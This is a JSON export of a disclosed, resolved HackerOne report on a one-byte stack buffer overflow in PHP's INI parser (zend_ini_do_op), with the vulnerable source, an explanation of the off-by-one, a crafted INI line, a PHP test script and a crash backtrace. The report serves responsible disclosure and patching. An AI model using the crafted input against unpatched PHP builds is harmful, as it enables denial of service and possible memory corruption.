{
  "id": 248601,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDg2MDE=",
  "url": "https://hackerone.com/reports/248601",
  "title": "PHP INI Parsing Stack Buffer Overflow Vulnerability",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-07-12T09:21:09.097Z",
  "submitted_at": "2017-07-12T09:21:09.097Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "xixabangm4",
    "url": "/xixabangm4",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYS6T2T4S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T124612Z&X-Amz-Expires=2345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC%2FRlgMvrp4sI%2BNN%2Bw0e%2BHS%2Fi0X4FFUjwI6hTqAUnQWYQIgPZYpGqRtUrQEdEqyjQ7VWI1A7cqBCtguMbt4YIuIcNIqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDIwmV%2FtI2Z%2BVlVJQOCqOBc7CvK4xINdfRva6PibURBsgRmkDXf%2FsfRb09TcUdBlBFNmKVkxQPEdRC1Mnq1DDtMy%2FcGXOrpRoAxZrwVEpSHxUpZo%2FJRAHbOWAQBUrr1l1gC6t9Ol8wWC7PLi7X%2FD2%2BIDYKaPOL3QSa9PdanrueH6WdeJdiGnGVaFnEkwm%2BHPy%2BNshabbrQKXqkiQ%2FKRYoPLt1dvZ1N24FQHGKbhJBHzJTQzkx7Zrace5bXg%2BJgLt6PscN7h%2BULLdZS9N80mauppM1Bvb6ZAc1mkJWSe0udi0WKGIY51k32kzf%2FZRlsjDjv3wLANMhuaYZxtbiG3WqGDC8fit9fFP3v6IHyuIqz8W%2FJG6NK1zlTj4Bv2ofITBdDLGFFR8yKVIFqByGSOWGgKHI%2Bp%2FU758TaX5fX5ORVjWG5txmLAIp2Ye6HKb1jos9tPe0WwKFf1VXSzM%2BIPDtrwzelzeq1ecGD7Qov%2BE7m6FSNQhrPCH5MWK76q29U5jHq4v9GWkh6dO8IcaXMgC5%2BVrL8P1250J44UPDKtphXTjBb3iA00qdsdp1F%2B%2Fa15Q2N6WK4Zj8yXgSiYj5SqlvrlLooUiEv4FjCaTKJ%2B%2F6X9LlHBvM59P7vynVxy%2FZvv1tVFuE%2B1IJtkjeAr5%2BJZnYlQqnuceFw3MjImSw8YPBpzvy4Syrbl%2FiRlfszmlv0xFykH9Tf1k32eSbbbhd5%2B5c1f0w5Do%2F0wB%2B%2F7HU5grw%2Fsc%2Fa4ONp4AL9dothtFzDI9yrU86H0Tj%2BgA4bfs%2Bq8KiM04Zifmo5%2BSqSn50Vbg%2BbyS%2BCKKHCDlA%2FBvQCMxY1dpo4pqPW8%2FQk9SE5zpcrHezMMGRkJg26Wm6o5Sur%2BuuyvPlmvWPTnE137%2FSashTujC8pqyuBjqxAQugPapY7MCgoHnN3A9t0%2FPfp1FpK4tJONEidbWkGhXB6NA90wXv8DKSeZxQJFUZ19mDVzE0iG0%2BiihjuEoeGetVY82tVdAOUT4mlhJqZaL%2FmnCgfpwcatSd2OhHah3YU4JQGvlArly1nhC20oudJ%2FsRukkppx66K%2BMQZDqC%2BF8kHc8TtamF0NWCg6ZU6SXNGyIAZPkCoGCxc2Yn3P3JIGfWLiNvqDATfN7jYp4Rp1toDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f42889e589a5a99969c541aa9923e0bf854b807c787fd71164b69b0d222412ce",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYS6T2T4S%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T124612Z&X-Amz-Expires=2345&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQC%2FRlgMvrp4sI%2BNN%2Bw0e%2BHS%2Fi0X4FFUjwI6hTqAUnQWYQIgPZYpGqRtUrQEdEqyjQ7VWI1A7cqBCtguMbt4YIuIcNIqsQUIcBADGgwwMTM2MTkyNzQ4NDkiDIwmV%2FtI2Z%2BVlVJQOCqOBc7CvK4xINdfRva6PibURBsgRmkDXf%2FsfRb09TcUdBlBFNmKVkxQPEdRC1Mnq1DDtMy%2FcGXOrpRoAxZrwVEpSHxUpZo%2FJRAHbOWAQBUrr1l1gC6t9Ol8wWC7PLi7X%2FD2%2BIDYKaPOL3QSa9PdanrueH6WdeJdiGnGVaFnEkwm%2BHPy%2BNshabbrQKXqkiQ%2FKRYoPLt1dvZ1N24FQHGKbhJBHzJTQzkx7Zrace5bXg%2BJgLt6PscN7h%2BULLdZS9N80mauppM1Bvb6ZAc1mkJWSe0udi0WKGIY51k32kzf%2FZRlsjDjv3wLANMhuaYZxtbiG3WqGDC8fit9fFP3v6IHyuIqz8W%2FJG6NK1zlTj4Bv2ofITBdDLGFFR8yKVIFqByGSOWGgKHI%2Bp%2FU758TaX5fX5ORVjWG5txmLAIp2Ye6HKb1jos9tPe0WwKFf1VXSzM%2BIPDtrwzelzeq1ecGD7Qov%2BE7m6FSNQhrPCH5MWK76q29U5jHq4v9GWkh6dO8IcaXMgC5%2BVrL8P1250J44UPDKtphXTjBb3iA00qdsdp1F%2B%2Fa15Q2N6WK4Zj8yXgSiYj5SqlvrlLooUiEv4FjCaTKJ%2B%2F6X9LlHBvM59P7vynVxy%2FZvv1tVFuE%2B1IJtkjeAr5%2BJZnYlQqnuceFw3MjImSw8YPBpzvy4Syrbl%2FiRlfszmlv0xFykH9Tf1k32eSbbbhd5%2B5c1f0w5Do%2F0wB%2B%2F7HU5grw%2Fsc%2Fa4ONp4AL9dothtFzDI9yrU86H0Tj%2BgA4bfs%2Bq8KiM04Zifmo5%2BSqSn50Vbg%2BbyS%2BCKKHCDlA%2FBvQCMxY1dpo4pqPW8%2FQk9SE5zpcrHezMMGRkJg26Wm6o5Sur%2BuuyvPlmvWPTnE137%2FSashTujC8pqyuBjqxAQugPapY7MCgoHnN3A9t0%2FPfp1FpK4tJONEidbWkGhXB6NA90wXv8DKSeZxQJFUZ19mDVzE0iG0%2BiihjuEoeGetVY82tVdAOUT4mlhJqZaL%2FmnCgfpwcatSd2OhHah3YU4JQGvlArly1nhC20oudJ%2FsRukkppx66K%2BMQZDqC%2BF8kHc8TtamF0NWCg6ZU6SXNGyIAZPkCoGCxc2Yn3P3JIGfWLiNvqDATfN7jYp4Rp1toDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d8690501fbf8348c853a297d6ca718484260abe997948f14ca2dc07658b282cf"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2017-11628"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-10-14T04:35:45.029Z",
  "bug_reporter_agreed_on_going_public_at": "2019-10-14T04:35:44.961Z",
  "team_member_agreed_on_going_public_at": "2019-10-13T09:19:05.907Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Description:\n\nA stack buffer overflow exists in the latest stable release of PHP-7.1.5 and PHP-5.6.30 in PHP INI parsing API, which may accept network / local filesystem input. On malformed inputs, a stack buffer overflow in zend_ini_do_op() could write 1-byte off a fixed size stack buffer. On installations with the stack smashing mitigation, this would cause an immediate DoS; upto optimization levels, build options and stack buffer overflow mitigations, this vulnerability may allow corrupting other local variables or the frame pointer, potentially allows remotely executing code.\n\n### Impact:\n\nAffects 32-bit builds of PHP 5 before 5.6.31 ([ChangeLog](http://php.net/ChangeLog-5.php)) and PHP 7 before 7.1.7 ([ChangeLog](http://php.net/ChangeLog-7.php)).\nResolved PHP [bug report](https://bugs.php.net/bug.php?id=74603), will update the pending CVE.\n\n### Exploitability:\n\nIf the specific build affected has built-in stack smashing mitigation, an immediate DoS can be expected. If no such mitigation in place, it is possible to overwrite one byte of the adjacent variable on stack, or the stack frame pointer, depending on compiler optimizations. The issue can be triggered via a crafted .ini file (not limited to php.ini - which is usually protected), an INI string that gets passed into parse_ini_string(), or the command-line option for INI string (not really a valid attack vector except for demonstration).\n\nIn php-7.1.5/Zend/zend_long.h:\n```\n110 #if SIZEOF_ZEND_LONG == 4\n111 # define MAX_LENGTH_OF_LONG 11\n112 # define LONG_MIN_DIGITS \"2147483648\"\n113 #elif SIZEOF_ZEND_LONG == 8\n114 # define MAX_LENGTH_OF_LONG 20\n115 # define LONG_MIN_DIGITS \"9223372036854775808\"\n116 #else\n117 # error \"Unknown SIZEOF_ZEND_LONG\"\n118 #endif\n```\nIn php-7.1.5/Zend/zend_ini_parser.c:\n```\n 123 /* {{{ zend_ini_do_op()\n 124 */\n 125 static void zend_ini_do_op(char type, zval *result, zval *op1, zval *op2)\n 126 {\n 127         int i_result;\n 128         int i_op1, i_op2;\n 129         int str_len;\n 130         char str_result[MAX_LENGTH_OF_LONG];\n 131 \n 132         i_op1 = atoi(Z_STRVAL_P(op1));\n 133         zend_string_free(Z_STR_P(op1));\n 134         if (op2) {\n 135                 i_op2 = atoi(Z_STRVAL_P(op2));\n 136                 zend_string_free(Z_STR_P(op2));\n 137         } else {\n 138                 i_op2 = 0;\n 139         }\n 140 \n 141         switch (type) {\n 142                 case '|':\n 143                         i_result = i_op1 | i_op2;\n 144                         break;\n 145                 case '&':\n 146                         i_result = i_op1 & i_op2;\n 147                         break;\n 148                 case '^':\n 149                         i_result = i_op1 ^ i_op2;\n 150                         break;\n 151                 case '~':\n 152                         i_result = ~i_op1;\n 153                         break;\n 154                 case '!':\n 155                         i_result = !i_op1;\n 156                         break;\n 157                 default:\n 158                         i_result = 0;\n 159                         break;\n 160         }\n 161 \n 162         str_len = zend_sprintf(str_result, \"%d\", i_result);\n 163         ZVAL_NEW_STR(result, zend_string_init(str_result, str_len, ZEND_SYSTEM_INI));\n 164 }\n 165 /* }}} */\n```\nThe minimums, \"-2147483648\" and \"-9223372036854775808\" are of length 11 and 20 respectively, \nthe proper definition of str_result[] array would be: str_result[MAX_LENGTH_OF_LONG + 1]. A\ncrafted ini entry would cause an overflow.\n\nTest script:\n```\n$ cat input.ini\n0=0&~2000000000\n\n$ cat input.php\n<?php \n\n$argc = $_SERVER['argc'];\n$argv = $_SERVER['argv'];\n\n$file_loc = dirname(__FILE__).\"/\".$argv[1];\n\nvar_dump(parse_ini_file($file_loc, true, INI_SCANNER_NORMAL));\n\n?>\n```\nTo reproduce:\n```\n$ bin/php input.php input.ini\n\n*** buffer overflow detected ***: bin/php terminated\n======= Backtrace: =========\n/lib/i386-linux-gnu/libc.so.6(+0x68e4e)[0xb7527e4e]\n/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x6b)[0xb75ba85b]\n/lib/i386-linux-gnu/libc.so.6(+0xfa6ea)[0xb75b96ea]\n/lib/i386-linux-gnu/libc.so.6(+0xf9e48)[0xb75b8e48]\n/lib/i386-linux-gnu/libc.so.6(_IO_default_xsputn+0x8e)[0xb752fc0e]\n/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x89b)[0xb7502f3b]\n/lib/i386-linux-gnu/libc.so.6(__vsprintf_chk+0xb1)[0xb75b8f01]\n/lib/i386-linux-gnu/libc.so.6(__sprintf_chk+0x2f)[0xb75b8e2f]\nbin/php[0x82e7aa0]\nbin/php[0x82e87d3]\nbin/php(zend_parse_ini_file+0x47)[0x82e8b07]\nbin/php[0x8255788]\nbin/php[0x83631f6]\nbin/php(execute_ex+0x22)[0x8353c52]\nbin/php(zend_execute+0x13b)[0x83a341b]\nbin/php(zend_execute_scripts+0x30)[0x8313010]\nbin/php(php_execute_script+0x286)[0x82b3f26]\nbin/php[0x83a57de]\nbin/php[0x80683b9]\n/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xb74d8a83]\nbin/php[0x8068444]\n======= Memory map: ========\n08048000-0888d000 r-xp 00000000 08:01 704181     /home/weilei/php7_gdb/bin/php\n0888d000-0888e000 r--p 00844000 08:01 704181     /home/weilei/php7_gdb/bin/php\n0888e000-08899000 rw-p 00845000 08:01 704181     /home/weilei/php7_gdb/bin/php\n08899000-088b2000 rw-p 00000000 00:00 0 \n09ae7000-09b9a000 rw-p 00000000 00:00 0          [heap]\nb7000000-b7200000 r--p 00000000 08:01 271314     /usr/lib/locale/locale-archive\nb7200000-b7400000 rw-p 00000000 00:00 0 \nb7464000-b7480000 r-xp 00000000 08:01 787579     /lib/i386-linux-gnu/libgcc_s.so.1\nb7480000-b7481000 rw-p 0001b000 08:01 787579     /lib/i386-linux-gnu/libgcc_s.so.1\nb7496000-b74bf000 rw-p 00000000 00:00 0 \nb74bf000-b7667000 r-xp 00000000 08:01 787552     /lib/i386-linux-gnu/libc-2.19.so\nb7667000-b7669000 r--p 001a8000 08:01 787552     /lib/i386-linux-gnu/libc-2.19.so\nb7669000-b766a000 rw-p 001aa000 08:01 787552     /lib/i386-linux-gnu/libc-2.19.so\nb766a000-b766d000 rw-p 00000000 00:00 0 \nb766d000-b7670000 r-xp 00000000 08:01 787569     /lib/i386-linux-gnu/libdl-2.19.so\nb7670000-b7671000 r--p 00002000 08:01 787569     /lib/i386-linux-gnu/libdl-2.19.so\nb7671000-b7672000 rw-p 00003000 08:01 787569     /lib/i386-linux-gnu/libdl-2.19.so\nb7672000-b7673000 rw-p 00000000 00:00 0 \nb7673000-b76b7000 r-xp 00000000 08:01 787602     /lib/i386-linux-gnu/libm-2.19.so\nb76b7000-b76b8000 r--p 00043000 08:01 787602     /lib/i386-linux-gnu/libm-2.19.so\nb76b8000-b76b9000 rw-p 00044000 08:01 787602     /lib/i386-linux-gnu/libm-2.19.so\nb76b9000-b76cc000 r-xp 00000000 08:01 787678     /lib/i386-linux-gnu/libresolv-2.19.so\nb76cc000-b76cd000 ---p 00013000 08:01 787678     /lib/i386-linux-gnu/libresolv-2.19.so\nb76cd000-b76ce000 r--p 00013000 08:01 787678     /lib/i386-linux-gnu/libresolv-2.19.so\nb76ce000-b76cf000 rw-p 00014000 08:01 787678     /lib/i386-linux-gnu/libresolv-2.19.so\nb76cf000-b76e4000 rw-p 00000000 00:00 0 \nb76e4000-b76e5000 r--s 00000000 08:01 554280     /home/weilei/php7_gdb/input.ini\nb76e5000-b76e6000 r--p 00855000 08:01 271314     /usr/lib/locale/locale-archive\nb76e6000-b76e8000 rw-p 00000000 00:00 0 \nb76e8000-b76ea000 r--p 00000000 00:00 0          [vvar]\nb76ea000-b76ec000 r-xp 00000000 00:00 0          [vdso]\nb76ec000-b770c000 r-xp 00000000 08:01 787528     /lib/i386-linux-gnu/ld-2.19.so\nb770c000-b770d000 r--p 0001f000 08:01 787528     /lib/i386-linux-gnu/ld-2.19.so\nb770d000-b770e000 rw-p 00020000 08:01 787528     /lib/i386-linux-gnu/ld-2.19.so\nbff25000-bff47000 rw-p 00000000 00:00 0          [stack]\nAborted\n```\n",
  "weakness": {
    "id": 3,
    "name": "Classic Buffer Overflow"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:19:06.022Z",
  "allow_singular_disclosure_after": -134278026.98904705,
  "singular_disclosure_allowed": true,
  "vote_count": 2,
  "voters": [
    "smodnix",
    "japz"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "low",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
